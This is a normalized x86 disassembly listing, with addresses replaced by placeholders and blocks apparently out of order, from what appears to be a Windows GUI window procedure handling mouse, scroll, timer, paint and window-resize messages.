inc [ eax + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx esi
sub ecx edx
cmp ecx eax
jl r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub esi ecx
cmp esi eax
jl r-xdata
lea edx [ esp + 0x4c ]
push edx
push 0x0
push 0x0
lea ecx [ esp + 0x50 ]
push ecx
jmp r-xdata
cmp eax 0x7
jne r-xdata
push 0x0
lea ecx [ esp + 0x50 ]
mov [ rw-data ] 0x1
mov [ esp + 0x1d4 ] 0x114
push ecx
jmp r-xdata
push esi
push 0x1
push 0x4
push eax
call sub_48efa0
add esp 0x10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jg r-xdata
xor esi esi
mov ecx eax
call sub_460fa0
mov esi eax
jmp r-xdata
mov eax ebp
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp ebx edi
jne r-xdata
mov ebx 0x2
cmp eax ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax ecx
je r-xdata
mov ecx [ eax + 0x12c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x12c ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ ecx + 0x14 ]
sub eax edi
push eax
push esi
push edx
push 0x0
call sub_401150
test eax eax
jne r-xdata
cmp ebx [ ecx ]
je r-xdata
dec eax
cmp esi eax
jge r-xdata
test al 0x10
je r-xdata
mov eax 0x2
jmp r-xdata
xor edi edi
cmp eax 0x5
mov [ rw-data ] edi
jle r-xdata
cmp ecx 0x207
jne r-xdata
mov edi 0x2
and eax 0xfffffffd
jmp r-xdata
test al 0x1
je r-xdata
cmp ecx edi
je r-xdata
push esi
push edi
push 0x3
push eax
call sub_48efa0
mov ecx [ rw-data ]
add esp 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ ebp + 0x24 ] edi
mov edx [ rw-data ]
mov [ ebp + 0x4 ] edx
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov ecx [ rw-data ]
mov [ ebp + 0x14 ] ecx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov eax [ rw-data ]
mov [ ebp + 0x10 ] eax
mov cl [ rw-data ]
mov [ ebp + 0x18 ] cl
mov edx [ rw-data ]
mov [ ebp + 0x128 ] edx
mov eax [ rw-data ]
mov [ ebp + 0x1c ] eax
mov ecx [ rw-data ]
mov [ ebp + 0x130 ] ecx
mov edx [ rw-data ]
mov [ ebp + 0x134 ] edx
mov eax [ rw-data ]
mov [ ebp + 0x138 ] eax
mov ecx [ rw-data ]
mov [ ebp + 0x13c ] ecx
mov edx [ rw-data ]
mov [ ebp + 0x140 ] edx
mov al [ rw-data ]
mov [ ebp + 0x144 ] al
mov ecx [ rw-data ]
mov [ ebp + 0x148 ] ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0xb
push ebx
call [ KillTimer@IAT ]
mov eax [ rw-data ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_4930ec ]
call sub_45e3f0
mov eax [ rw-data ]
mov edi [ esp + 0x60 ]
mov ebx [ esp + 0x64 ]
mov [ esp + 0x48 ] eax
mov eax edi
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ esp + 0x3c ] eax
mov ecx ebx
shr ecx 0x3
movzx eax bp
add esp 0x8
xor esi esi
cmp eax 0x7
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x60 ]
mov [ esp + 0x38 ] 0x20
ja r-xdata
mov [ rw-data ] 0x1
mov [ esp + 0x1d0 ] 0x115
mov [ esp + 0x11 ] al
cmp [ rw-data ] ebx
je r-xdata
push 0xa
push ebx
call [ KillTimer@IAT ]
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
mov esi 0x1
jne r-xdata
mov eax [ rw-data ]
sub eax ebp
cdq
xor eax edx
sub eax edx
cmp eax ecx
jle r-xdata
lea eax [ esp + 0x1cc ]
push eax
mov ecx rw-data
call sub_453720
mov ecx [ rw-data ]
cmp ecx ebp
je r-xdata
mov [ esi + 0x124 ] ebp
mov [ esi + 0x12c ] ebp
cmp [ rw-data ] ebp
push 0xffffffff
lea ecx [ esi + 0x108 ]
push ebp
jne r-xdata
xor ebp ebp
cmp esi ebp
mov [ esp + 0x14 ] esi
je r-xdata
mov ebp [ esp + 0x14 ]
cmp ebp edi
je r-xdata
cmp ebx [ edx + esi * 4 ]
je r-xdata
cmp esi eax
jge r-xdata
push ebx
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x1cc ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call sub_466930
add esp 0x18
mov edx [ rw-data ]
xor esi esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
call sub_466930
mov eax [ rw-data ]
add esp 0x18
test eax eax
jle r-xdata
cmp ebx edi
jne r-xdata
cmp esi 0x201
je r-xdata
cmp ebx edi
je r-xdata
cmp ebx edi
je r-xdata
lea ecx [ esp + 0x7c ]
push ecx
push ebx
call [ BeginPaint@IAT ]
mov esi eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
lea edx [ esp + 0x30 ]
push edx
call [ GetCursorPos@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ ScreenToClient@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov edx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x48 ]
push eax
push ecx
push edx
call sub_477a80
add esp 0x20
mov [ rw-data ] 0x0
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x124 ]
mov [ rw-data ] ecx
jmp r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call [ GetWindowRect@IAT ]
mov al [ rw-data ]
shl esi 0x4
test al al
je r-xdata
inc esi
add ecx 0x4
jmp r-xdata
test al 0x20
jne r-xdata
mov eax 0x5
jmp r-xdata
lea esi [ eax + 0x1 ]
jmp r-xdata
sub eax 0x3
cmp ecx 0x20b
jne r-xdata
mov edi 0x5
and eax 0xffffffef
jmp r-xdata
test al 0x2
je r-xdata
mov esi 0x1
jmp r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
jmp r-xdata
push esi
push 0x1
push 0x4
push ecx
call sub_48efa0
add esp 0x10
mov ebp [ esp + 0x1d0 ]
xor esi esi
cmp ebp 0x202
jne r-xdata
cmp [ rw-data ] 0x10
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
push 0x0
push 0x0
inc ecx
push 0x4
push eax
mov [ rw-data ] ecx
call sub_48efa0
add esp 0x10
mov [ rw-data ] esi
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push 0x1
push 0x0
push 0x4
push eax
mov [ rw-data ] eax
call sub_48efa0
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
push esi
push esi
push 0x1
push eax
call sub_48efa0
add esp 0x10
mov [ rw-data ] esi
mov [ rw-data ] esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ rw-data ]
mov esi [ esp + edx * 4 + 0x30 ]
neg esi
jne r-xdata
mov eax [ rw-data ]
mov esi [ esp + eax * 4 + 0x30 ]
test esi esi
jne r-xdata
mov esi ebx
neg esi
jmp r-xdata
mov esi ebx
jmp r-xdata
mov esi edi
neg esi
jmp r-xdata
mov esi edi
jmp r-xdata
mov eax ecx
cdq
and edx 0xffff
add eax edx
sar eax 0x10
mov esi ebp
shr esi 0x10
shl eax 0x10
add esi eax
sub esi ecx
cmp esi 0xffff8000
jge r-xdata
mov al [ rw-data ]
mov ebp [ esp + 0x1cc ]
xor bl bl
test al al
mov [ esp + 0x12 ] bl
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
mov edi [ rw-data ]
mov ebx [ esp + 0x1cc ]
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call [ GetWindowRect@IAT ]
mov edi [ rw-data ]
cmp edi ebp
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax 0x1
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push edi
push 0xffffffeb
push ebx
call [ SetWindowLongA@IAT ]
mov eax [ rw-data ]
cmp eax edi
mov edx [ rw-data ]
mov [ rw-data ] edx
je r-xdata
mov esi [ ebp + 0x20 ]
cmp esi edi
je r-xdata
mov ecx esi
inc esi
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call sub_43ff60
add esp 0x8
jmp r-xdata
call sub_43d200
jmp r-xdata
mov edi eax
mov eax [ edi + 0x12c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ GetDC@IAT ]
lea edx [ esp + 0x18 ]
mov esi eax
mov eax [ rw-data ]
push edx
push eax
call [ GetClientRect@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x2c ]
push ecx
push esi
call sub_45cef0
mov edx [ esp + 0x40 ]
mov ebx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
sub edx ebx
push edx
sub eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0xe0 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov ebp [ lstrlenA@IAT ]
add esp 0x2c
lea edx [ esp + 0xbc ]
push edx
call ebp
mov edi [ TextOutA@IAT ]
push eax
lea eax [ esp + 0xc0 ]
push eax
push 0x0
push 0x0
push esi
call edi
mov al [ rw-data ]
test al al
je r-xdata
call sub_43d200
mov [ rw-data ] 0x1
jmp r-xdata
cmp esi 0x204
je r-xdata
cmp [ esp + 0x1d4 ] 0x1
jne r-xdata
push 0xfffffff0
push ebx
call ebp
and eax 0x300000
cmp eax 0x300000
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x90 ]
push eax
push 0x0
push ebx
push esi
call sub_478af0
mov eax [ rw-data ]
add esp 0x1c
test eax eax
je r-xdata
cmp ebx [ rw-data ]
jne r-xdata
push ebx
call [ GetDC@IAT ]
mov esi eax
push 0x0
push esi
call sub_473580
add esp 0x8
push esi
push ebx
call [ ReleaseDC@IAT ]
mov eax [ rw-data ]
mov ecx [ eax + esi ]
mov edx [ eax + esi + 0x8 ]
add eax esi
mov esi [ esp + 0x20 ]
sub edx ecx
mov ecx [ esp + 0x18 ]
sub esi ecx
cmp esi edx
jne r-xdata
mov eax [ rw-data ]
mov edx [ esp + 0x18 ]
add esi eax
mov [ esi ] edx
mov eax [ esp + 0x1c ]
mov [ esi + 0x4 ] eax
mov ecx [ esp + 0x20 ]
mov [ esi + 0x8 ] ecx
mov edx [ esp + 0x24 ]
mov [ esi + 0xc ] edx
mov [ rw-data ] 0x0
jmp r-xdata
test edx edx
jne r-xdata
mov eax 0x6
test bl 0x4
jne r-xdata
call [ timeGetTime@IAT ]
mov edx [ esp + 0x28 ]
mov ecx eax
lea eax [ esi + edx * 8 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x80
je r-xdata
mov ecx [ esp + 0x1d4 ]
shr ecx 0x10
cmp cx 0x1
jne r-xdata
test al 0x10
je r-xdata
mov esi 0x2
jmp r-xdata
cmp esi edi
jne r-xdata
cmp ebp 0x205
jne r-xdata
mov esi 0x1
jmp r-xdata
mov eax esi
lea ecx [ ebp + 0x108 ]
lea edi [ eax + 0x1 ]
lea ebx [ ebx ]
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esp + 0x60 ]
lea ecx [ eax + esi ]
test ecx ecx
jge r-xdata
cmp bp 0x5
je r-xdata
cmp bp 0x8
jne r-xdata
cmp bp 0x63
jne r-xdata
or esi 0xffffffff
jmp r-xdata
mov esi 0x1
jmp r-xdata
cmp esi 0x8000
jle r-xdata
add esi 0x10000
jmp r-xdata
cmp [ esp + 0x1d0 ] 0xa0
je r-xdata
cmp ebp edi
jne r-xdata
mov esi [ rw-data ]
sub esi edi
sar esi 0x4
xor esi esi
jmp r-xdata
mov [ esi ] ebp
jmp r-xdata
call sub_401dd0
push esi
push 0xffffffeb
push ebx
call [ SetWindowLongA@IAT ]
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edi
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx edi
mov [ eax ] edx
jne r-xdata
mov [ ebp + 0x20 ] edi
mov esi [ ebp + 0x24 ]
cmp esi edi
je r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov eax ebp
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
cmp edx edi
jne r-xdata
mov eax [ esp + 0x1cc ]
cmp eax [ rw-data ]
je r-xdata
call sub_46fdf0
mov eax [ rw-data ]
test eax eax
mov esi [ esp + 0x1cc ]
je r-xdata
mov ecx [ edx + esi * 4 ]
test ecx ecx
je r-xdata
cmp esi eax
jge r-xdata
mov ecx [ rw-data ]
push esi
push ecx
call [ ReleaseDC@IAT ]
mov edx [ rw-data ]
push 0x0
push edx
call [ ValidateRect@IAT ]
jmp r-xdata
push r--data
call ebp
push eax
push r--data
push 0x10
push 0x0
push esi
call edi
mov eax [ rw-data ]
imul eax eax 0x1c
cmp [ eax + rw-data ] 0x10
mov ecx [ eax + rw-data ]
jb r-xdata
cmp esi 0x207
je r-xdata
mov edi [ esp + 0x1d8 ]
add [ edi + 0xc ] 0xffffffec
lea eax [ esp + 0x4c ]
push eax
push ebx
call [ GetWindowRect@IAT ]
lea ecx [ esp + 0x6c ]
push ecx
push ebx
call [ GetClientRect@IAT ]
mov edx [ edi + 0xc ]
lea eax [ esp + 0x30 ]
push eax
push ebx
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] edx
call [ ScreenToClient@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x1
push 0x14
push 0x20
call esi
mov ecx [ edi + 0x8 ]
shl eax 0x1
sub ecx eax
sub ecx [ edi ]
push ecx
push 0x21
call esi
mov edx [ edi + 0xc ]
sub edx eax
push edx
push 0x21
call esi
add eax [ edi ]
push eax
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x12c ]
push ecx
call [ MoveWindow@IAT ]
jmp r-xdata
push ebx
call [ GetWindowDC@IAT ]
lea edx [ esp + 0x6c ]
push edx
push ebx
mov esi eax
call [ GetClientRect@IAT ]
lea eax [ esp + 0x4c ]
push eax
push ebx
call [ GetWindowRect@IAT ]
lea ecx [ esp + 0x30 ]
xor eax eax
push ecx
push ebx
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
call [ ClientToScreen@IAT ]
mov edx [ esp + 0x74 ]
mov ebp [ esp + 0x4c ]
mov edi [ esp + 0x30 ]
mov eax [ esp + 0x78 ]
mov ecx [ esp + 0x34 ]
sub edx ebp
add edx edi
mov edi [ GetSystemMetrics@IAT ]
mov [ esp + 0x18 ] edx
sub eax [ esp + 0x50 ]
add eax ecx
push 0x2
mov [ esp + 0x20 ] eax
call edi
add eax [ esp + 0x18 ]
push 0x3
mov [ esp + 0x24 ] eax
call edi
mov ecx [ esp + 0x1c ]
push 0x8
add eax ecx
push 0x3
lea ecx [ esp + 0x20 ]
push ecx
push esi
mov [ esp + 0x34 ] eax
call [ DrawFrameControl@IAT ]
push esi
push ebx
call [ ReleaseDC@IAT ]
jmp r-xdata
lea ecx [ esp + 0x7c ]
push ecx
push ebx
call [ EndPaint@IAT ]
cmp [ rw-data ] 0x1
je r-xdata
cmp ebx [ rw-data ]
jne r-xdata
lea edx [ esp + 0x84 ]
push edx
call sub_43d2c0
add esp 0x4
mov [ eax ] ecx
mov ecx [ esp + 0x1c ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
push 0x0
mov [ eax + 0x8 ] edx
mov ecx [ esp + 0x28 ]
push 0x1
push ebx
mov [ eax + 0xc ] ecx
call sub_47e8e0
mov edx [ rw-data ]
push 0x1
push 0x0
push 0x0
push ebx
push edx
call sub_47e330
add esp 0x20
mov esi [ eax + 0x4 ]
mov edx [ eax + 0xc ]
mov ebp [ esp + 0x1c ]
sub edx esi
mov esi [ esp + 0x24 ]
sub esi ebp
cmp esi edx
je r-xdata
mov esi [ GetAsyncKeyState@IAT ]
push 0x10
call esi
test ah ah
js r-xdata
mov ebx [ rw-data ]
cmp ebx edi
jle r-xdata
cmp eax 0x82
jne r-xdata
cmp cx 0x2
jne r-xdata
mov edi 0x6
and eax 0xffffffdf
test al 0x24
jne r-xdata
mov esi 0x5
jmp r-xdata
cmp [ rw-data ] edx
jne r-xdata
xor esi esi
cmp ebp 0x208
jne r-xdata
mov esi 0x2
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] esi
mov [ rw-data ] 0x0
push 0x0
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ ecx + 0x14 ]
sub eax edi
push eax
push esi
push edx
push 0x0
call sub_401150
mov ecx [ rw-data ]
neg eax
sbb eax eax
not eax
and eax ecx
mov [ ebp + 0x124 ] eax
mov edx edi
sub edx ebx
inc edx
lea ecx [ eax + esi ]
cmp ecx edx
jle r-xdata
mov esi eax
neg esi
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
test eax eax
jle r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
lea ecx [ esp + 0x30 ]
push ecx
call [ GetCursorPos@IAT ]
mov esi [ esp + 0x1cc ]
lea edx [ esp + 0x30 ]
push edx
push esi
call [ ScreenToClient@IAT ]
mov ecx [ rw-data ]
movzx edx [ esp + 0x30 ]
xor eax eax
test ecx ecx
movzx ecx [ esp + 0x34 ]
setge al
shl ecx 0x10
or ecx edx
push ecx
dec eax
and eax 0xf0
add eax 0xffffff88
movzx eax ax
shl eax 0x10
push eax
push 0x20a
push esi
call [ SendMessageA@IAT ]
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
mov [ esp + 0x40 ] 0x0
sub esi 0x10000
mov edx [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
call [ GetClientRect@IAT ]
cmp [ esp + 0x11 ] 0x1
mov edi [ esp + 0x40 ]
je r-xdata
lea ecx [ esp + 0x30 ]
push ecx
call [ GetCursorPos@IAT ]
mov edx [ esp + 0x30 ]
cmp edx [ rw-data ]
mov esi [ LockWindowUpdate@IAT ]
jne r-xdata
mov eax ecx
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
cmp edx ebp
mov ecx [ rw-data ]
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx edi
mov [ eax ] edx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx ebp
mov [ ebp + 0x24 ] edi
call sub_461010
push ebp
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x14 ] edi
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp esi edi
jle r-xdata
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ edx + ecx * 4 ] eax
mov ebp [ rw-data ]
mov edx [ rw-data ]
inc ecx
jmp r-xdata
dec eax
cmp ecx eax
jge r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x1
push 0x14
push 0x20
call esi
mov edx [ esp + 0x28 ]
shl eax 0x1
sub edx eax
sub edx [ esp + 0x20 ]
push edx
push 0x21
call esi
mov ecx [ esp + 0x30 ]
sub ecx eax
sub ecx 0x14
push ecx
push 0x21
call esi
add eax [ esp + 0x28 ]
mov edx [ edi + 0x12c ]
push eax
push edx
call [ MoveWindow@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x1
mov [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp esi eax
jne r-xdata
inc esi
jmp r-xdata
mov eax [ ecx + 0xd30 ]
test eax eax
je r-xdata
lea eax [ eax + rw-data ]
mov eax [ eax + rw-data ]
jmp r-xdata
cmp esi 0x20b
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov esi 0x202
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_43d380
test [ esp + 0x40 ] 0x40
jne r-xdata
mov eax [ esp + 0x28 ]
push edi
push ebp
push esi
push eax
mov [ rw-data ] ecx
mov [ rw-data ] edi
call sub_48efa0
add esp 0x10
mov [ rw-data ] edi
jmp r-xdata
mov eax ebp
cdq
xor eax edx
sub eax edx
cmp eax 0x1
mov [ rw-data ] 0x1
jle r-xdata
cmp edi edx
je r-xdata
mov edi 0x7
and eax 0xffffffbf
jmp r-xdata
mov esi 0x6
test al 0x48
jne r-xdata
mov [ esp + 0x4c ] edx
mov [ esp + 0x58 ] edx
mov [ esp + 0x5c ] edx
mov edx [ esp + 0x1d8 ]
mov eax 0x20c
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x1d4 ]
push edx
push eax
mov [ esp + 0x58 ] 0x202
mov [ esp + 0x5c ] 0x205
mov [ esp + 0x68 ] 0x208
mov ecx [ esp + edi * 4 + 0x54 ]
push ecx
push ebp
mov [ rw-data ] edi
call [ SendMessageA@IAT ]
cmp [ rw-data ] edx
jne r-xdata
cmp ebp 0x20c
jne r-xdata
mov esi 0x5
jmp r-xdata
push 0x0
push 0x1
push esi
call sub_48efa0
add esp 0x10
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push eax
push ebx
lea eax [ esp + 0x5c ]
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
push 0xa
push 0xb
push ebx
mov [ rw-data ] esi
call [ SetTimer@IAT ]
jmp r-xdata
test esi esi
je r-xdata
sub edi eax
sub edi ebx
inc edi
mov esi edi
cmp [ esp + 0x1d0 ] 0x114
jne r-xdata
add eax 0x4
mov [ rw-data ] esi
jmp r-xdata
cmp bp 0x8
jne r-xdata
mov [ esp + 0x11 ] 0x1
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edi 0x1
cmp eax edi
jne r-xdata
mov eax [ esp + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
cmp edx ebp
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
mov ecx rw-data
call sub_46b7e0
jmp r-xdata
dec eax
cmp esi eax
jae r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp edx edi
jne r-xdata
mov edi [ rw-data ]
mov ecx esi
shl ecx 0x4
mov ebx [ ecx + edi - 0x10 ]
lea eax [ ecx + edi - 0x10 ]
mov ecx [ eax + 0x4 ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
dec esi
mov [ esp + 0x20 ] ecx
mov ecx esi
mov [ esp + 0x24 ] eax
shl ecx 0x4
cmp edx edi
jne r-xdata
push 0x0
push 0x1
push esi
call sub_47e8e0
mov eax [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push eax
call sub_43ff60
add esp 0x8
test edx edx
jne r-xdata
call sub_43a280
mov edx [ rw-data ]
push ecx
push eax
push 0x20
push 0x0
push esi
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx eax
shl edx 0x5
cmp [ edx + rw-data ] esi
jne r-xdata
mov esi [ rw-data ]
or eax 0xffffffff
cmp esi eax
je r-xdata
mov eax 0x7
jmp r-xdata
test bl 0x8
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov [ rw-data ] edi
mov esi 0x7
jmp r-xdata
xor esi esi
jmp r-xdata
call [ timeGetTime@IAT ]
test esi esi
mov ebp eax
mov [ rw-data ] edi
je r-xdata
mov eax [ esp + 0x1d4 ]
shr eax 0x10
cmp ax 0x1
jne r-xdata
push 0xa
xor ebp ebp
push ebx
mov [ rw-data ] ebp
call edi
push ebp
push ebp
push 0x2
push esi
mov [ rw-data ] ebp
call sub_48efa0
add esp 0x10
test eax eax
jne r-xdata
mov edx [ esp + 0x1d0 ]
xor ecx ecx
xor eax eax
cmp edx 0x114
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
add ecx eax
mov [ esp + 0x28 ] ecx
fild [ esp + 0x28 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
mov [ esp + 0x28 ] ecx
fild [ esp + 0x28 ]
jmp r-xdata
mov esi [ esp + 0x1cc ]
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov eax [ esp + 0x1d0 ]
cmp eax 0x114
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
test edi edi
je r-xdata
cmp [ rw-data ] 0x1
mov ebx [ GetSystemMetrics@IAT ]
jne r-xdata
test [ rw-data ] 0x8
je r-xdata
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
sub ebp edx
sar ebp 0x2
xor ebp ebp
jmp r-xdata
mov eax ebp
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
push 0x1
push 0x0
push 0x0
push esi
push ecx
call sub_47e330
add esp 0x14
jmp r-xdata
mov eax [ rw-data ]
push eax
call sub_4a9250
add esp 0x4
test al al
mov eax [ rw-data ]
je r-xdata
call sub_45f9e0
mov eax [ rw-data ]
cmp eax 0x9
je r-xdata
mov [ esp + 0x13 ] 0x1
jmp r-xdata
mov ecx eax
shl ecx 0x5
cmp [ ecx + rw-data ] esi
jne r-xdata
push 0x4
push 0x0
push 0x2
push eax
call sub_48efa0
add esp 0x10
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
push 0x11
call esi
test ah ah
jns r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
inc eax
cmp eax ebx
mov [ rw-data ] eax
jl r-xdata
cmp [ rw-data ] edi
jne r-xdata
cmp edi esi
jge r-xdata
cmp ax 0x2
jne r-xdata
mov esi 0x6
push ebp
push ebp
push 0x1
push esi
call sub_48efa0
add esp 0x10
jmp r-xdata
mov edx [ esp + 0x40 ]
push edx
mov eax esi
push eax
push ecx
call sub_47ae00
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x40 ]
push edx
mov ecx esi
push eax
push ecx
call sub_47ae00
add esp 0xc
jmp r-xdata
jle r-xdata
cdq
sub eax edx
mov edx eax
sar edx 0x1
mov eax esi
sub eax edx
cdq
idiv ecx
imul eax ecx
mov esi eax
test esi esi
jne r-xdata
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
test esi esi
mov ecx eax
jge r-xdata
push 0x0
push 0x63
push eax
push esi
mov [ rw-data ] 0x0
call [ PostMessageA@IAT ]
jmp r-xdata
mov esi [ rw-data ]
mov ecx esi
imul ecx ebx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx esi
imul ecx edi
mov [ esp + 0x30 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] esi
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ esp + 0x30 ]
push edx
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
cmp eax [ esp + 0x30 ]
jne r-xdata
mov al [ esp + 0x11 ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
mov bl 0x1
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ rw-data ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
add ecx 0xfffffffe
shl ecx 0x4
add ecx edi
mov [ ecx ] eax
mov edx [ esp + 0x1c ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x20 ]
mov [ ecx + 0x8 ] eax
